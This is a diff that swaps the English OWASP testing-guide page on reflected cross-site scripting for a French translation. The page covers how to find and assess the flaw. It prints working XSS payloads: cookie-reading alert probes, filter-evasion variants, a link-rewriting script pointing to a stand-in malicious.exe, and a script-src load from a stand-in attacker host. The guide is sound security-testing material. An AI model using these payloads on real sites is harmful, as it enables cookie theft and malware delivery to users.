@@ -1,153 +1,153 @@
-# Testing for Reflected Cross Site Scripting
+# Test pour les scripts intersites réfléchis
 
 |ID          |
 |------------|
 |WSTG-INPV-01|
 
-## Summary
+## Sommaire
 
-Reflected [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.
+Les [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) réfléchis se produisent lorsqu'un attaquant injecte du code exécutable de navigateur dans une seule réponse HTTP. L'attaque injectée n'est pas stockée dans l'application elle-même ; il n'est pas persistant et n'affecte que les utilisateurs qui ouvrent un lien ou une page Web tiers construit de manière malveillante. La chaîne d'attaque est incluse dans les paramètres URI ou HTTP spécialement conçus, traitée de manière incorrecte par l'application et renvoyée à la victime.
 
-Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.
+Les XSS réfléchis sont le type le plus fréquent d'attaques XSS trouvées dans la nature. Les attaques XSS réfléchies sont également appelées attaques XSS non persistantes et, puisque la charge utile de l'attaque est livrée et exécutée via une seule demande et réponse, elles sont également appelées XSS de premier ordre ou de type 1.
 
-When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim's browser.
+Lorsqu'une application Web est vulnérable à ce type d'attaque, elle transmet au client les entrées non validées envoyées via les requêtes. Le modus operandi commun de l'attaque comprend une étape de conception, dans laquelle l'attaquant crée et teste un URI incriminé, une étape d'ingénierie sociale, dans laquelle il convainc ses victimes de charger cet URI sur leurs navigateurs, et l'exécution éventuelle du code incriminé en utilisant le navigateur de la victime.
 
-Commonly the attacker's code is written in the JavaScript language, but other scripting languages are also used, e.g., ActionScript and VBScript. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).
+Généralement, le code de l'attaquant est écrit en langage JavaScript, mais d'autres langages de script sont également utilisés, par exemple, ActionScript et VBScript. Les attaquants exploitent généralement ces vulnérabilités pour installer des enregistreurs de frappe, voler les cookies des victimes, voler le presse-papiers et modifier le contenu de la page (par exemple, les liens de téléchargement).
 
-One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out `<script>`, but might not filter `%3cscript%3e` which simply includes another encoding of tags.
+L'un des principaux obstacles à la prévention des vulnérabilités XSS est le codage correct des caractères. Dans certains cas, le serveur Web ou l'application Web ne peut pas filtrer certains encodages de caractères. Ainsi, par exemple, l'application Web peut filtrer `<script>`, mais peut ne pas filtrer `%3cscript%3e` qui inclut simplement un autre encodage de balises.
 
-## Test Objectives
+## Objectifs des tests
 
-- Identify variables that are reflected in responses.
-- Assess the input they accept and the encoding that gets applied on return (if any).
+- Identifier les variables qui sont reflétées dans les réponses.
+- Évaluez l'entrée qu'ils acceptent et l'encodage qui est appliqué au retour (le cas échéant).
 
-## How to Test
+## Comment tester
 
-### Black-Box Testing
+### Test de la boîte noire
 
-A black-box test will include at least three phases:
+Un test boîte noire comprendra au moins trois phases :
 
-#### Detect Input Vectors
+#### Détecter les vecteurs d'entrée
 
-Detect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.
+Détecter les vecteurs d'entrée. Pour chaque page Web, le testeur doit déterminer toutes les variables définies par l'utilisateur de l'application Web et comment les saisir. Cela inclut les entrées masquées ou non évidentes telles que les paramètres HTTP, les données POST, les valeurs de champ de formulaire masquées et les valeurs de radio ou de sélection prédéfinies. Généralement, des éditeurs HTML ou des proxies Web intégrés au navigateur sont utilisés pour afficher ces variables masquées. Voir l'exemple ci-dessous.
 
-#### Analyze Input Vectors
+#### Analyser les vecteurs d'entrée
 
-Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.
-  Some example of such input data are the following:
+Analysez chaque vecteur d'entrée pour détecter les vulnérabilités potentielles. Pour détecter une vulnérabilité XSS, le testeur utilise généralement des données d'entrée spécialement conçues avec chaque vecteur d'entrée. Ces données d'entrée sont généralement inoffensives, mais déclenchent des réponses du navigateur Web qui manifestent la vulnérabilité. Les données de test peuvent être générées à l'aide d'un fuzzer d'application Web, d'une liste prédéfinie automatisée de chaînes d'attaque connues ou manuellement.
+  Voici quelques exemples de telles données d'entrée :
 
 - `<script>alert(123)</script>`
 - `"><script>alert(document.cookie)</script>`
 
-For a comprehensive list of potential test strings see the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
+Pour une liste complète des chaînes de test potentielles, consultez le [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
 
-#### Check Impact
+#### Vérifier l'impact
 
-For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.
+Pour chaque entrée de test tentée dans la phase précédente, le testeur analysera le résultat et déterminera s'il représente une vulnérabilité qui a un impact réaliste sur la sécurité de l'application Web. Cela nécessite d'examiner le code HTML de la page Web résultante et de rechercher l'entrée de test. Une fois trouvé, le testeur identifie tous les caractères spéciaux qui n'ont pas été correctement encodés, remplacés ou filtrés. L'ensemble de caractères spéciaux non filtrés vulnérables dépendra du contexte de cette section de HTML.
 
-Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:
+Idéalement, tous les caractères spéciaux HTML seront remplacés par des entités HTML. Les principales entités HTML à identifier sont :
 
-- `>` (greater than)
-- `<` (less than)
-- `&` (ampersand)
-- `'` (apostrophe or single quote)
-- `"` (double quote)
+- `>` (supérieur à)
+- `<` (moins de)
+- `&` (esperluette)
+- `'` (apostrophe ou guillemet simple)
+- `"` (guillemets doubles)
 
-However, a full list of entities is defined by the HTML and XML specifications. [Wikipedia has a complete reference](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).
+Cependant, une liste complète d'entités est définie par les spécifications HTML et XML. [Wikipedia a une référence complète](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).
 
-Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:
+Dans le contexte d'une action HTML ou d'un code JavaScript, un ensemble différent de caractères spéciaux devra être échappé, encodé, remplacé ou filtré. Ces personnages incluent :
 
-- `\n` (new line)
-- `\r` (carriage return)
-- `'` (apostrophe or single quote)
-- `"` (double quote)
-- `\` (backslash)
-- `\uXXXX` (unicode values)
+- `\n` (nouvelle ligne)
+- `\r` (retour chariot)
+- `'` (apostrophe ou guillemet simple)
+- `"` (guillemets doubles)
+- `\` (barre oblique inverse)
+- `\uXXXX` (valeurs unicode)
 
-For a more complete reference, see the [Mozilla JavaScript guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).
+Pour une référence plus complète, consultez le [guide JavaScript de Mozilla](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).
 
-#### Example 1
+#### Exemple 1
 
-For example, consider a site that has a welcome notice `Welcome %username%` and a download link.
+Par exemple, considérez un site qui a un avis de bienvenue "Welcome %username%" et un lien de téléchargement.
 
-![XSS Example 1](images/XSS_Example1.png)\
-*Figure 4.7.1-1: XSS Example 1*
+![Exemple XSS 1](images/XSS_exemple1.png)\
+*Figure 4.7.1-1 : Exemple XSS 1*
 
-The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.
+Le testeur doit soupçonner que chaque point d'entrée de données peut entraîner une attaque XSS. Pour l'analyser, le testeur jouera avec la variable utilisateur et tentera de déclencher la vulnérabilité.
 
-Let's try to click on the following link and see what happens:
-
-```text
-http://example.com/index.php?user=<script>alert(123)</script>
-```
-
-If no sanitization is applied this will result in the following popup:
-
-![Alert](images/Alert.png)\
-*Figure 4.7.1-2: XSS Example 1*
-
-This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody's browser if he clicks on the tester's link.
-
-#### Example 2
-
-Let's try other piece of code (link):
+Essayons de cliquer sur le lien suivant et voyons ce qui se passe :
 
 ```text
-http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexample.com/malicious.exe";}</script>
+http://exemple.com/index.php?user=<script>alert(123)</script>
 ```
 
-This produces the following behavior:
+Si aucune désinfection n'est appliquée, cela entraînera la fenêtre contextuelle suivante :
 
-![XSS Example 2](images/XSS_Example2.png)\
-*Figure 4.7.1-3: XSS Example 2*
+![Alerte](images/Alerte.png)\
+*Figure 4.7.1-2 : XSS exemple 1*
 
-This will cause the user, clicking on the link supplied by the tester, to download the file `malicious.exe` from a site they control.
+Cela indique qu'il existe une vulnérabilité XSS et il apparaît que le testeur peut exécuter le code de son choix dans le navigateur de n'importe qui s'il clique sur le lien du testeur.
 
-### Bypass XSS Filters
+#### exemple 2
 
-Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.
+Essayons un autre morceau de code (lien):
 
-Thus, the majority of XSS prevention must depend on the web application's sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A deny list may not include all possible attack strings, an allow list may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters.
+```text
+http://exemple.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexemple.com/malicious.exe";}</script>
+```
 
-The [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documents common filter evasion tests.
+Cela produit le comportement suivant :
 
-#### Example 3: Tag Attribute Value
+![XSS exemple 2](images/XSS_exemple2.png)\
+*Figure 4.7.1-3 : XSS exemple 2*
 
-Since these filters are based on a deny list, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of `<script>` tags and even without the use of characters such as `<` and `>` that are commonly filtered.
+Cela amènera l'utilisateur, en cliquant sur le lien fourni par le testeur, à télécharger le fichier `malicious.exe` à partir d'un site qu'il contrôle.
 
-For example, the web application could use the user input value to fill an attribute, as shown in the following code:
+### Contourner les filtres XSS
+
+Les attaques de script intersite réfléchies sont empêchées car l'application Web nettoie les entrées, un pare-feu d'application Web bloque les entrées malveillantes ou par des mécanismes intégrés dans les navigateurs Web modernes. Le testeur doit tester les vulnérabilités en supposant que les navigateurs Web n'empêcheront pas l'attaque. Les navigateurs peuvent être obsolètes ou avoir des fonctions de sécurité intégrées désactivées. De même, il n'est pas garanti que les pare-feu d'applications Web reconnaissent les nouvelles attaques inconnues. Un attaquant pourrait créer une chaîne d'attaque qui n'est pas reconnue par le pare-feu de l'application Web.
+
+Ainsi, la majorité de la prévention XSS doit dépendre de la désinfection par l'application Web des entrées utilisateur non fiables. Il existe plusieurs mécanismes à la disposition des développeurs pour le nettoyage, tels que le renvoi d'une erreur, la suppression, l'encodage ou le remplacement d'une entrée non valide. Le moyen par lequel l'application détecte et corrige les entrées non valides est une autre faiblesse principale dans la prévention du XSS. Une liste de refus peut ne pas inclure toutes les chaînes d'attaque possibles, une liste d'autorisation peut être trop permissive, le nettoyage peut échouer ou un type d'entrée peut être incorrectement approuvé et rester non nettoyé. Tous ces éléments permettent aux attaquants de contourner les filtres XSS.
+
+Le [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documente les tests courants d'évasion de filtre.
+
+#### exemple 3 : Valeur d'attribut de balise
+
+Étant donné que ces filtres sont basés sur une liste de refus, ils ne peuvent pas bloquer tous les types d'expressions. En fait, il existe des cas dans lesquels un exploit XSS peut être effectué sans l'utilisation de balises `<script>` et même sans l'utilisation de caractères tels que `<` et `>` qui sont couramment filtrés.
+
+Par exemple, l'application Web peut utiliser la valeur saisie par l'utilisateur pour remplir un attribut, comme illustré dans le code suivant :
 
 ```html
 <input type="text" name="state" value="INPUT_FROM_USER">
 ```
 
-Then an attacker could submit the following code:
+Un attaquant pourrait alors soumettre le code suivant :
 
 ```text
 " onfocus="alert(document.cookie)
 ```
 
-#### Example 4: Different Syntax or Encoding
+#### exemple 4 : Syntaxe ou encodage différent
 
-In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the encoding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.
+Dans certains cas, il est possible que les filtres basés sur les signatures puissent être simplement vaincus en masquant l'attaque. Généralement, vous pouvez le faire en insérant des variations inattendues dans la syntaxe ou dans l'encodage. Ces variations sont tolérées par les navigateurs comme HTML valide lorsque le code est renvoyé, et pourtant elles pourraient également être acceptées par le filtre.
 
-Following some examples:
+Suite à quelques exemples :
 
 - `"><script >alert(document.cookie)</script >`
 - `"><ScRiPt>alert(document.cookie)</ScRiPt>`
 - `"%3cscript%3ealert(document.cookie)%3c/script%3e`
 
-#### Example 5: Bypassing Non-Recursive Filtering
+#### exemple 5 : contournement du filtrage non récursif
 
-Sometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:
+Parfois, la désinfection n'est appliquée qu'une seule fois et elle n'est pas effectuée de manière récursive. Dans ce cas, l'attaquant peut contourner le filtre en envoyant une chaîne contenant plusieurs tentatives, comme celle-ci :
 
 ```text
 <scr<script>ipt>alert(document.cookie)</script>
 ```
 
-#### Example 6: Including External Script
+#### exemple 6 : Inclure un script externe
 
-Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:
+Supposons maintenant que les développeurs du site cible aient implémenté le code suivant pour protéger l'entrée de l'inclusion d'un script externe :
 
 ```php
 <?
@@ -162,68 +162,68 @@ Now suppose that developers of the target site implemented the following code to
 ?>
 ```
 
-Decoupling the above regular expression:
+Découplage de l'expression régulière ci-dessus :
 
-1. Check for a `<script`
-2. Check for a " " (white space)
-3. Any character but the character `>` for one or more occurrences
-4. Check for a `src`
+1. Recherchez un `<script`
+2. Recherchez un " " (espace blanc)
+3. N'importe quel caractère sauf le caractère `>` pour une ou plusieurs occurrences
+4. Recherchez un `src`
 
-This is useful for filtering expressions like `<script src="http://attacker/xss.js"></script>` which is a common attack. But, in this case, it is possible to bypass the sanitization by using the `>` character in an attribute between script and src, like this:
-
-```text
-http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
-```
-
-This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim web site, `http://example/`.
-
-#### Example 7: HTTP Parameter Pollution (HPP)
-
-Another method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the [Testing for HTTP Parameter pollution](04-Testing_for_HTTP_Parameter_Pollution.md) for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms.
-Regular attack:
+Ceci est utile pour filtrer des expressions comme `<script src="http://attacker/xss.js"></script>` qui est une attaque courante. Mais, dans ce cas, il est possible de contourner le nettoyage en utilisant le caractère `>` dans un attribut entre script et src, comme ceci :
 
 ```text
-http://example/page.php?param=<script>[...]</script>
+http://exemple/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
 ```
 
-Attack using HPP:
+Cela exploitera la vulnérabilité de cross site scripting illustrée précédemment, en exécutant le code JavaScript stocké sur le serveur Web de l'attaquant comme s'il provenait du site Web de la victime, `http://exemple/`.
+
+#### exemple 7 : pollution des paramètres HTTP (HPP)
+
+Une autre méthode pour contourner les filtres est la pollution des paramètres HTTP, cette technique a été présentée pour la première fois par Stefano di Paola et Luca Carettoni en 2009 lors de la conférence OWASP Pologne. Voir le [Test de la pollution des paramètres HTTP] (04-Testing_for_HTTP_Parameter_Pollution.md) pour plus d'informations. Cette technique d'évasion consiste à scinder un vecteur d'attaque entre plusieurs paramètres portant le même nom. La manipulation de la valeur de chaque paramètre dépend de la façon dont chaque technologie Web analyse ces paramètres, de sorte que ce type d'évasion n'est pas toujours possible. Si l'environnement testé concatène les valeurs de tous les paramètres avec le même nom, alors un attaquant pourrait utiliser cette technique afin de contourner les mécanismes de sécurité basés sur des modèles.
+Attaque régulière :
 
 ```text
-http://example/page.php?param=<script&param=>[...]</&param=script>
+http://exemple/page.php?param=<script>[...]</script>
 ```
 
-See the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors' browsers.
+Attaque utilisant HPP :
 
-### Gray-Box Testing
+```text
+http://exemple/page.php?param=<script&param=>[...]</&param=script>
+```
 
-Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and how the user input is rendered back to the user might be known by the pen-tester.
+Voir la [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) pour une liste plus détaillée des techniques d'évasion de filtre. Enfin, l'analyse des réponses peut devenir complexe. Une façon simple de le faire est d'utiliser du code qui fait apparaître une boîte de dialogue, comme dans notre exemple. Cela indique généralement qu'un attaquant pourrait exécuter du code JavaScript arbitraire de son choix dans les navigateurs des visiteurs.
 
-If source code is available (white-box testing), all variables received from users should be analyzed. Moreover the tester should analyze any sanitization procedures implemented to decide if these can be circumvented.
+### Test de la boîte grise
 
-## Tools
+Les tests en boîte grise sont similaires aux tests en boîte noire. Dans les tests en boîte grise, le pen-testeur a une connaissance partielle de l'application. Dans ce cas, les informations concernant l'entrée de l'utilisateur, les contrôles de validation d'entrée et la manière dont l'entrée de l'utilisateur est restituée à l'utilisateur peuvent être connues du testeur de plume.
 
-- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
-- [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
-- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
-- [ratproxy](https://code.google.com/archive/p/ratproxy/) is a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.
-- [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
-- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
+Si le code source est disponible (test en boîte blanche), toutes les variables reçues des utilisateurs doivent être analysées. De plus, le testeur doit analyser toutes les procédures de désinfection mises en œuvre pour décider si elles peuvent être contournées.
 
-## References
+## Outils
 
-### OWASP Resources
+- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) vous aide à encoder des textes arbitraires vers et depuis 65 types de jeux de caractères que vous pouvez utiliser dans vos charges utiles personnalisées.
+- [Hackvertor](https://hackvertor.co.uk/public) est un outil en ligne qui permet de nombreux types d'encodage et d'obscurcissement de JavaScript (ou de toute entrée de chaîne).
+- [XSS-Proxy](http://xss-proxy.sourceforge.net/) est un outil avancé d'attaque Cross-Site-Scripting (XSS).
+- [ratproxy](https://code.google.com/archive/p/ratproxy/) est un outil d'audit de sécurité des applications Web semi-automatisé et largement passif, optimisé pour une détection précise et sensible, et une annotation automatique, des potentiels problèmes et modèles de conception liés à la sécurité basés sur l'observation du trafic existant initié par l'utilisateur dans des environnements Web 2.0 complexes.
+- [Burp Proxy](https://portswigger.net/burp/) est un serveur proxy HTTP/S interactif pour attaquer et tester des applications Web.
+- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) est un serveur proxy HTTP/S interactif pour attaquer et tester des applications Web avec un scanner intégré.
 
-- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+## Références
 
-### Books
+### Ressources OWASP
 
-- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
-- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
-- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3
+- [Fiche de triche pour l'évasion du filtre XSS] (https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
 
-### Whitepapers
+### Livres
 
-- [CERT - Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
-- [cgisecurity.com - The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)
-- [G.Ollmann - HTML Code Injection and Cross-site scripting](http://www.technicalinfo.net/papers/CSS.html)
-- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://www.techzoom.net/Publications/Insecurity-Iceberg)
+- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", deuxième édition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
+- Dafydd Stuttard, Marcus Pinto - "Le manuel de l'application Web - Découvrir et exploiter les failles de sécurité", 2008, Wiley, ISBN 978-0-470-17077-9
+- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10 : 1-59749-154- 3
+
+### Papiers blanc
+
+- [CERT - Balises HTML malveillantes intégrées dans les requêtes Web des clients] (https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
+- [cgisecurity.com - La FAQ sur les scripts intersites](https://www.cgisecurity.com/xss-faq.html)
+- [G.Ollmann - Injection de code HTML et script intersite](http://www.technicalinfo.net/papers/CSS.html)
+- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Comprendre la menace du navigateur Web](https://www.techzoom.net/Publications/Insecurity-Iceberg)
